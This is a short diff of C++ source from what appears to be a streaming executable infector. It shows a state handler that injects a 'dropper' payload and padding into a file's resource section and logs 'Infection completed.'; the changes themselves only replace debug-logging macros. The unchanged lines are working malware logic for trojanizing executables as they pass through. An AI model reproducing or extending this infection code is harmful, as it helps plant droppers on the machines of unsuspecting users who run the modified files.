@@ -24,7 +24,7 @@ StateResult InjectDropper::process()
 {
 	ImageSectionHeader& section = context<StreamingMelter>().resourceSection();
 	context<StreamingMelter>().complete( section->SizeOfRawData );
-	DBGTRACE_HEX("Sending resource data: ", (DWORD) section->SizeOfRawData, NOTIFY);
+	DEBUG_MSG(D_VERBOSE, "Sending resource data: %d", (DWORD) section->SizeOfRawData);
 
 	// relocate restore stub with currentOffset
 	Dropper& dropper = context<StreamingMelter>().dropper();
@@ -32,19 +32,19 @@ StateResult InjectDropper::process()
 
 	std::size_t dropperSize = dropper.size();
 	context<StreamingMelter>().complete(dropper.data(), dropperSize);
-	DBGTRACE_HEX("Injecting dropper size: ", (DWORD) dropperSize, NOTIFY);
+	DEBUG_MSG(D_INFO, "Injecting dropper size: %d", (DWORD) dropperSize);
 
 	DWORD sentSectionSize = section->SizeOfRawData + dropperSize;
 	DWORD fileAlignment = context<StreamingMelter>().fileAlignment();
 	DWORD predictedSectionSize = alignTo(section->SizeOfRawData + dropperSize, fileAlignment);
-	DBGTRACE_HEX("Predicted resource size: ", predictedSectionSize, NOTIFY);
+	DEBUG_MSG(D_INFO, "Predicted resource size: %d", predictedSectionSize);
 	DWORD missingBytesToPredictedSize = predictedSectionSize - sentSectionSize;
-	DBGTRACE_HEX("Missing bytes to predicted size: ", missingBytesToPredictedSize, NOTIFY);
+	DEBUG_MSG(D_INFO, "Missing bytes to predicted size: %d", missingBytesToPredictedSize);
 
 	std::vector<char> padding(missingBytesToPredictedSize, 0);
 	context<StreamingMelter>().complete( &padding[0], missingBytesToPredictedSize);
-	DBGTRACE_HEX("Injecting padding size: ", (DWORD) missingBytesToPredictedSize, NOTIFY);
-	DBGTRACE("Infection completed.", "", NOTIFY);
+	DEBUG_MSG(D_INFO, "Injecting padding size: %d", (DWORD) missingBytesToPredictedSize);
+	DEBUG_MSG(D_INFO, "Infection completed.");
 
 	offsetToNext() = currentOffset() + neededBytes();
 
